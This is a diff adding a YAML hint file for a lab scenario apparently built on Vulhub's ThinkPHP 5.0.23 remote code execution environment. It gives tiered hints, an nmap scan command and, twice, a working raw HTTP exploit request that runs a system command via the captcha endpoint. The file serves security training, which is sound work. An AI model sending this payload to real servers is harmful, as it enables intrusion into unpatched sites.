@@ -1,0 +1,84 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: thinkphp/5.0.23-rce
+hint_levels:
+  low:
+  - Inspect the thinkphp service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080`.'
+  high:
+  - 'Vulnerability: ThinkPHP5 5.0.23 Remote Code Execution Vulnerability.'
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    POC
+
+    Send the packets and execute the command `id`:
+
+    ```
+    POST /index.php?s=captcha HTTP/1.1
+    Host: {{NODE_IP}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: en
+    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+
+    _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/5.0.23-rce/1.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/5.0.23-rce/README.md'
+  - |-
+    Additional public references:
+    - https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003
+access_instructions:
+  title: ThinkPHP5 5.0.23 Remote Code Execution Vulnerability
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080`.
+  - title: POC
+    instructions: |-
+      Send the packets and execute the command `id`:
+
+      ```
+      POST /index.php?s=captcha HTTP/1.1
+      Host: {{NODE_IP}}
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      Accept-Language: en
+      User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+      Connection: close
+      Content-Type: application/x-www-form-urlencoded
+
+      _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/5.0.23-rce/1.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/5.0.23-rce/README.md
+  readme_sha256: bd221ffd07143f7e1409954b578c952ae577ac94eafdfa31314c18804766b85a
+  compose_sha256: 60f723b634c2327d42ba571c2c163fdb364811d5beab6542c930b447f006ec77
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
